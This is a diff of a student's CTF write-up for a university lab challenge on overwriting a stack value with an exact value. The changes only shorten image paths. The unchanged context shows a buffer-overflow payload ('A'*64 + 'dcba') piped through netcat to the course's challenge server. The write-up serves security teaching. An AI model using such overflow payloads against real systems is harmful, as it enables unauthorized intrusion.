@@ -18,8 +18,8 @@ For this challenge, I was also given two files.
 
 - An executable.
 - The source code of the executable.
-![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Files.png]]
-![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Source.png]]
+![[Files.png]]
+![[Source.png]]
 
 The source code shows the same structure as the previous challenge but requires a specific overwrite value.
 
@@ -63,7 +63,7 @@ I used this payload to extract the flag.
 python3 -c "print('A'*64 + 'dcba')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 25152
 ```
 
-![[IST/SSoF/CTF's/ist1117363/Lab5/Match an Exact Value/Images/Flag.png]]
+![[Flag.png]]
 
 ## FLAG
 ```flag
